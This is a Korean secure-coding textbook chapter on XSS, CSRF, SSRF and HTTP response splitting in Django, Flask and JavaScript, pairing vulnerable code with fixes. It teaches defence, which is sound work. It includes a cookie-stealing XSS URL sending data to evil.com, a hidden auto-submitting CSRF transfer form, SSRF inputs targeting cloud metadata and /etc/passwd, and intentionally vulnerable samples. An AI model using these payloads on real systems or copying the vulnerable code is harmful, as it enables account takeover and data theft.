# Chapter 04. 웹 요청을 노리는 공격

## 4-1. 크로스사이트 스크립트(XSS)

XSS 유형 비교도는 `diagram.md`를 참고하십시오.

### 개요

크로스사이트 스크립트(Cross-Site Scripting, XSS)는 웹 보안에서 가장 빈번하게 발생하는 취약점 중 하나입니다. 공격자가 웹 애플리케이션에 악성 스크립트(Script)를 삽입하여, 해당 페이지를 방문하는 다른 사용자의 브라우저에서 악성 코드가 실행되도록 만드는 공격입니다.

바이브 코딩으로 웹사이트를 만들 때, 사용자 입력을 화면에 출력하는 기능은 거의 모든 웹사이트에 존재합니다. 게시판, 댓글, 프로필, 검색 결과 등 어디서든 XSS 취약점이 발생할 수 있으므로, 여러분이 만드는 모든 웹페이지에서 이 취약점을 반드시 확인해야 합니다.

### 왜 위험한가

XSS 공격이 성공하면 공격자는 피해자의 브라우저에서 자바스크립트(JavaScript)를 실행할 수 있습니다:

> 세션(Session)이란 서버가 사용자를 식별하기 위해 유지하는 상태 정보이며, 쿠키(Cookie)는 이 정보를 브라우저에 저장하는 메커니즘입니다.

- **세션 탈취**: `document.cookie`를 통해 로그인 세션을 훔쳐 계정을 장악합니다

> **💡 팁:** 쿠키 보안 설정에 대한 자세한 내용은 11장 11-1절을 참고하십시오.

- **키로깅(Keylogging)**: 사용자의 키보드 입력을 기록하여 비밀번호를 탈취합니다
- **피싱**: 가짜 로그인 폼을 삽입하여 사용자 인증 정보를 수집합니다
- **악성코드 배포**: 방문자의 브라우저를 통해 악성 프로그램을 다운로드시킵니다
- **웹사이트 변조**: 페이지 내용을 임의로 수정하여 가짜 정보를 표시합니다

XSS 공격은 세 가지 유형으로 분류됩니다:

**유형 1 — 반사형 XSS(Reflected XSS)**

공격 스크립트가 URL 등의 요청에 포함되어 서버 응답에 그대로 반사(Reflected)되는 방식입니다. 공격자는 악성 스크립트가 포함된 링크를 피해자에게 전송하고, 피해자가 해당 링크를 클릭하면 스크립트가 실행됩니다.

```text
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

**유형 2 — 저장형 XSS(Stored XSS)**

공격 스크립트가 서버의 데이터베이스에 저장되어, 해당 데이터를 조회하는 모든 사용자에게 영향을 미치는 방식입니다. 게시판, 댓글, 프로필 페이지 등이 대표적인 공격 대상입니다. 반사형보다 훨씬 위험한 이유는 **한 번의 공격으로 다수의 피해자**가 발생하기 때문입니다.

**유형 3 — DOM 기반 XSS(DOM XSS)**

서버를 거치지 않고 클라이언트 측 자바스크립트에서 DOM(Document Object Model)을 조작하여 발생하는 XSS입니다. URL의 해시(#) 값이나 `location.search` 등을 통해 전달된 데이터가 검증 없이 DOM에 삽입될 때 발생합니다.

```javascript
// 위험한 DOM 조작의 예
document.getElementById('output').innerHTML = location.hash.substring(1);
```

### 취약한 코드

#### ❌ 취약한 코드: Django에서 mark_safe() 오용

```python
from django.shortcuts import render
from django.utils.safestring import mark_safe

def profile_link(request):
    # 외부 입력값을 검증 없이 HTML 태그 생성에 사용
    profile_url = request.POST.get('profile_url')
    profile_name = request.POST.get('profile_name')
    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # mark_safe()는 Django의 XSS 이스케이프 정책을 무력화합니다
    object_link = mark_safe(object_link)
    return render(request, 'my_profile.html', {'object_link': object_link})
```

`mark_safe()`는 Django에게 "이 문자열은 안전하니 이스케이프하지 마라"고 알려주는 함수입니다. 신뢰할 수 없는 사용자 입력에 이 함수를 사용하면 XSS 보호가 완전히 해제됩니다.

#### ❌ 취약한 코드: Django 템플릿에서 autoescape off 사용

```html
<!doctype html>
<html>
<body>
    <div class="content">
        {% autoescape off %}
        <!-- autoescape off로 설정하면 XSS 공격에 노출됩니다 -->
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터도 XSS 보호를 해제합니다 -->
        {{ content | safe }}
    </div>
</body>
</html>
```

> **⚠️ 주의:** AI 도구에 "HTML 태그가 그대로 보여야 해"라고 요청하면 `| safe` 필터나 `autoescape off`를 사용하는 코드가 생성될 수 있습니다. 이는 XSS 보호를 완전히 해제하는 것이므로 매우 위험합니다.

#### ❌ 취약한 코드: Flask에서 검증 없이 동적 페이지 생성

```python
from flask import Flask, request, render_template

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword')

    # 사용자의 입력을 검증이나 치환 없이 동적 웹페이지에 사용합니다
    return render_template('search.html', search_keyword=search_keyword)
```

#### ❌ 취약한 코드: JavaScript에서의 DOM XSS

```html
<script>
// URL 파라미터를 그대로 DOM에 삽입하면 XSS가 발생합니다
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// innerHTML은 HTML을 파싱하므로 스크립트가 실행될 수 있습니다
document.getElementById('search-result').innerHTML =
    '검색어: ' + keyword;
</script>
```

### 안전한 코드

#### ✅ 안전한 코드: Django에서 mark_safe() 제거

```python
from django.shortcuts import render

def profile_link(request):
    profile_url = request.POST.get('profile_url')
    profile_name = request.POST.get('profile_name')
    object_link = '<a href="{}">{}</a>'.format(profile_url, profile_name)

    # mark_safe()를 사용하지 않으면 Django가 자동으로 이스케이프합니다
    return render(request, 'my_profile.html', {'object_link': object_link})
```

#### ✅ 안전한 코드: Django 템플릿에서 autoescape on 유지

```html
<!doctype html>
<html>
<body>
    <div class="content">
        {% autoescape on %}
        <!-- autoescape on으로 XSS 공격을 방지합니다 -->
        {{ content }}
        {% endautoescape %}
    </div>
    <div class="content2">
        <!-- safe 필터를 사용하지 않습니다 -->
        {{ content }}
    </div>
</body>
</html>
```

> **💡 팁:** Django 템플릿은 기본적으로 `autoescape on`이 적용되어 있습니다. 특별한 이유가 없다면 이 설정을 변경하지 마십시오. `autoescape off`가 포함된 공통 템플릿을 `include`하거나 `extends`하면 해당 설정이 하위 템플릿까지 전파되므로 특히 주의해야 합니다.

#### ✅ 안전한 코드: Flask에서 html.escape() 사용

```python
import html
from flask import Flask, request, render_template

@app.route('/search', methods=['POST'])
def search():
    search_keyword = request.form.get('search_keyword')

    # HTML 엔티티 코드로 치환하여 스크립트 실행을 방지합니다
    escape_keyword = html.escape(search_keyword)
    return render_template('search.html', search_keyword=escape_keyword)
```

`html.escape()`는 `&`, `<`, `>`, `"`, `'` 등의 특수문자를 `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&#x27;`로 변환합니다.

#### ✅ 안전한 코드: JavaScript에서 textContent 사용

```html
<script>
const params = new URLSearchParams(window.location.search);
const keyword = params.get('q');

// textContent는 HTML을 파싱하지 않으므로 XSS에 안전합니다
document.getElementById('search-result').textContent =
    '검색어: ' + keyword;
</script>
```

> **💡 팁:** JavaScript에서 DOM을 조작할 때 `innerHTML` 대신 `textContent`를 사용하면 HTML 태그가 파싱되지 않아 XSS를 방지할 수 있습니다. HTML 구조를 동적으로 생성해야 하는 경우에는 `createElement()`와 `textContent`를 조합하십시오.

### 바이브 코딩 시 체크포인트

- [ ] **`mark_safe()`, `| safe`, `autoescape off`를 사용하고 있지 않은가?** 이 세 가지는 Django의 XSS 보호를 해제합니다
- [ ] **Flask에서 `html.escape()`를 사용하고 있는가?** Jinja2 템플릿의 자동 이스케이프만으로는 부족한 경우가 있습니다
- [ ] **JavaScript에서 `innerHTML`을 사용하고 있지 않은가?** `textContent`나 `createElement()`를 사용하십시오
- [ ] **사용자 입력이 HTML 속성에 들어가는 경우 따옴표로 감싸져 있는가?**
- [ ] **리치 텍스트 에디터(Rich Text Editor)를 사용하는 경우 서버 측 HTML 정화(Sanitization) 라이브러리를 적용했는가?** `bleach` 라이브러리 등을 사용하십시오

---

## 4-2. 크로스사이트 요청 위조(CSRF)

CSRF 공격 흐름도는 `diagram-csrf.md`를 참고하십시오.

### 개요

크로스사이트 요청 위조(Cross-Site Request Forgery, CSRF)는 사용자가 인지하지 못한 상황에서, 공격자가 의도한 행위(데이터 수정, 삭제, 등록 등)를 사용자 명의로 수행하게 만드는 공격입니다.

사용자가 웹사이트에 로그인한 상태에서 공격자가 만든 악성 페이지를 방문하면, 해당 페이지에서 사용자의 인증 정보(쿠키)를 이용하여 원래 사이트에 요청을 보냅니다. 서버는 이 요청이 사용자 본인의 의도인지 구분할 수 없습니다.

### 왜 위험한가

> **💡 팁:** 세션과 쿠키의 보안 설정은 11장 11-1절에서 자세히 다룹니다.

CSRF 공격의 대표적인 시나리오를 살펴보겠습니다:

1. 여러분이 만든 쇼핑몰에 사용자가 로그인합니다
2. 사용자가 다른 탭에서 공격자의 웹페이지를 방문합니다
3. 공격자의 페이지에는 다음과 같은 숨겨진 폼이 있습니다:

```html
<!-- 공격자의 페이지에 숨겨진 폼 -->
<form action="https://your-shop.com/transfer" method="POST" id="evil-form">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.getElementById('evil-form').submit();</script>
```

4. 사용자의 브라우저가 자동으로 로그인 쿠키를 포함하여 요청을 보냅니다
5. 서버는 정상 요청으로 판단하여 송금을 처리합니다

### 취약한 코드

#### ❌ 취약한 코드: Django 미들웨어에서 CSRF 비활성화

```python
# settings.py
MIDDLEWARE = [
    'django.contrib.sessions.middleware.SessionMiddleware',
    # CSRF 미들웨어를 주석 처리하면 전역적으로 CSRF 보호가 해제됩니다
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.locale.LocaleMiddleware',
]
```

#### ❌ 취약한 코드: @csrf_exempt 데코레이터 사용

```python
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

# csrf_exempt 데코레이터로 CSRF 보호를 해제합니다
@csrf_exempt
def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, '/view_wallet.html', {'wallet': ret})
```

#### ❌ 취약한 코드: 템플릿에서 csrf_token 누락

```html
<!--html page-->
<form action="" method="POST">
    <!-- form 태그 내부에 csrf_token이 없습니다 -->
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```

> **⚠️ 주의:** AI 도구가 "403 Forbidden 에러가 나요"라는 질문에 대해 `@csrf_exempt`를 추가하거나 CSRF 미들웨어를 제거하라고 답변하는 경우가 있습니다. 이는 문제를 해결하는 것이 아니라 보안 기능을 무력화하는 것입니다.

### 안전한 코드

#### ✅ 안전한 코드: Django CSRF 미들웨어 활성화

```python
# settings.py
MIDDLEWARE = [
    'django.contrib.sessions.middleware.SessionMiddleware',
    # CSRF 미들웨어를 반드시 활성화합니다
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.locale.LocaleMiddleware',
]
```

#### ✅ 안전한 코드: @csrf_exempt 제거

```python
from django.shortcuts import render

# csrf_exempt 데코레이터를 제거합니다
def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, '/view_wallet.html', {'wallet': ret})
```

#### ✅ 안전한 코드: Django 템플릿에 csrf_token 추가

```html
<!--html page-->
<form action="" method="POST">
    {% csrf_token %}  <!-- CSRF 토큰을 반드시 포함합니다 -->
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```

#### ✅ 안전한 코드: Flask에서 CSRF 보호 설정

```python
from flask import Flask
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')

# CSRF 보호를 활성화합니다
csrf = CSRFProtect()
csrf.init_app(app)
```

```html
<!-- Flask 템플릿 -->
<form action="" method="POST">
    <!-- CSRF 토큰을 hidden input으로 포함합니다 -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
    <table>
        {{ table }}
    </table>
    <input type="submit"/>
</form>
```

> **💡 팁:** Django에서 POST 요청 시 "403 Forbidden" 에러가 발생하면, CSRF를 비활성화하는 대신 템플릿의 `<form>` 태그 안에 `{% csrf_token %}`을 추가하십시오. 이것이 올바른 해결 방법입니다.

### 바이브 코딩 시 체크포인트

- [ ] **Django `settings.py`에서 `CsrfViewMiddleware`가 활성화되어 있는가?**
- [ ] **모든 POST 폼에 `{% csrf_token %}`(Django) 또는 `{{ csrf_token() }}`(Flask)가 포함되어 있는가?**
- [ ] **`@csrf_exempt` 데코레이터가 불필요하게 사용되고 있지 않은가?**
- [ ] **AJAX 요청 시 CSRF 토큰을 헤더에 포함하고 있는가?**

---

## 4-3. 서버사이드 요청 위조(SSRF)

SSRF 공격 흐름도는 `diagram-ssrf.md`를 참고하십시오.

### 개요

서버사이드 요청 위조(Server-Side Request Forgery, SSRF)는 공격자가 서버 측에서 다른 서버로 보내는 요청을 조작하여, 내부 네트워크의 자원에 접근하는 공격입니다.

바이브 코딩으로 외부 API를 호출하는 기능, URL 프리뷰(Preview) 기능, 웹훅(Webhook) 처리 등을 구현할 때 이 취약점에 노출될 수 있습니다.

### 왜 위험한가

SSRF는 공격자가 **서버의 신뢰된 네트워크 위치**를 악용하는 공격입니다:

- **내부 시스템 접근**: `http://192.168.0.45/admin`과 같이 외부에서 접근할 수 없는 관리자 페이지에 접근
- **클라우드 메타데이터 탈취**: `http://169.254.169.254/latest/meta-data/`로 AWS 인스턴스의 인증 키를 획득
- **내부 파일 열람**: `file:///etc/passwd`로 서버의 파일 시스템에 접근
- **포트 스캐닝**: 내부 네트워크의 서비스 구성을 파악

```text
# 공격자의 입력 예시
http://example.com/api?url=http://192.168.0.45/member/list.json
http://example.com/api?url=file:///etc/passwd
http://example.com/api?url=http://169.254.169.254/latest/meta-data/
```

### 취약한 코드

#### ❌ 취약한 코드: 사용자 입력 URL로 HTTP 요청

```python
from django.shortcuts import render
import requests

def call_third_party_api(request):
    addr = request.POST.get('address', '')

    # 사용자가 입력한 주소를 검증하지 않고 HTTP 요청을 보냅니다
    result = requests.get(addr).text
    return render(request, '/result.html', {'result': result})
```

### 안전한 코드

#### ✅ 안전한 코드: 허용 URL 화이트리스트 적용

```python
from django.shortcuts import render
import requests

# 허용하는 서버 목록을 화이트리스트로 관리합니다
# DNS rebinding 공격 방지를 위해 도메인보다 IP 사용을 권장합니다
ALLOW_SERVER_LIST = [
    'https://127.0.0.1/latest/',
    'https://192.168.0.1/user_data',
    'https://192.168.0.100/v1/public',
]

def call_third_party_api(request):
    addr = request.POST.get('address', '')

    # 화이트리스트에 포함된 URL만 허용합니다
    if addr not in ALLOW_SERVER_LIST:
        return render(request, '/error.html', {'error': '허용되지 않은 서버입니다.'})

    result = requests.get(addr).text
    return render(request, '/result.html', {'result': result})
```

#### ✅ 안전한 코드: URL 파싱 후 검증

```python
from urllib.parse import urlparse
import ipaddress
import requests

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # 클라우드 메타데이터
    ipaddress.ip_network('127.0.0.0/8'),     # 루프백
]

def safe_request(url):
    parsed = urlparse(url)

    # file:// 등의 위험한 프로토콜 차단
    if parsed.scheme not in ('http', 'https'):
        raise ValueError('허용되지 않은 프로토콜입니다.')

    # 내부 네트워크 IP 차단
    import socket
    ip = socket.gethostbyname(parsed.hostname)
    for network in BLOCKED_NETWORKS:
        if ipaddress.ip_address(ip) in network:
            raise ValueError('내부 네트워크 접근은 허용되지 않습니다.')

    return requests.get(url, timeout=5).text
```

> **💡 팁:** 클라우드 환경(AWS, GCP, Azure)에서는 메타데이터 서비스(169.254.169.254)에 대한 접근을 반드시 차단하십시오. 메타데이터를 통해 인스턴스의 IAM 역할 자격 증명이 탈취될 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력 URL로 서버에서 HTTP 요청을 보내는 코드가 있는가?**
- [ ] **URL 화이트리스트 또는 내부 네트워크 차단이 적용되어 있는가?**
- [ ] **`file://`, `gopher://` 등 위험한 프로토콜이 차단되어 있는가?**
- [ ] **클라우드 메타데이터 IP(169.254.169.254)에 대한 접근이 차단되어 있는가?**

---

## 4-4. HTTP 응답 분할(HTTP Response Splitting)

### 개요

HTTP 응답 분할(HTTP Response Splitting)은 HTTP 응답 헤더에 사용자 입력값이 포함될 때, 해당 입력에 개행문자(CR: `\r`, LF: `\n`)가 존재하면 HTTP 응답이 두 개 이상으로 분리되는 취약점입니다. 공격자는 이를 이용하여 두 번째 응답에 악성 코드를 주입할 수 있습니다.

### 왜 위험한가

응답 헤더가 분할되면 공격자가 완전히 새로운 HTTP 응답을 만들어낼 수 있습니다. 이를 통해 XSS 공격이나 캐시 훼손(Cache Poisoning) 공격이 가능합니다.

### 취약한 코드

#### ❌ 취약한 코드: 외부 입력을 응답 헤더에 직접 사용

```python
from django.http import HttpResponse

def route(request):
    content_type = request.POST.get('content-type')

    # 외부 입력값을 검증 없이 응답 헤더에 포함합니다
    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```

### 안전한 코드

#### ✅ 안전한 코드: 개행문자 제거

```python
from django.http import HttpResponse

def route(request):
    content_type = request.POST.get('content-type')

    # 응답 헤더에 포함될 수 있는 개행문자를 제거합니다
    content_type = content_type.replace('\r', '')
    content_type = content_type.replace('\n', '')

    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```

> **💡 팁:** 최신 버전의 Django와 Flask는 응답 헤더에서 개행문자를 자동으로 처리하는 보호 기능이 내장되어 있습니다. 하지만 프레임워크의 보호에만 의존하지 말고, 응답 헤더에 사용되는 외부 입력값은 항상 검증하는 습관을 가지십시오. 프레임워크와 라이브러리를 항상 최신 버전으로 유지하는 것도 중요합니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력값이 HTTP 응답 헤더(Set-Cookie, Content-Type, Location 등)에 포함되고 있지 않은가?**
- [ ] **불가피하게 포함되는 경우 `\r`, `\n` 개행문자가 제거되고 있는가?**
- [ ] **Django, Flask 등 프레임워크가 최신 버전인가?**
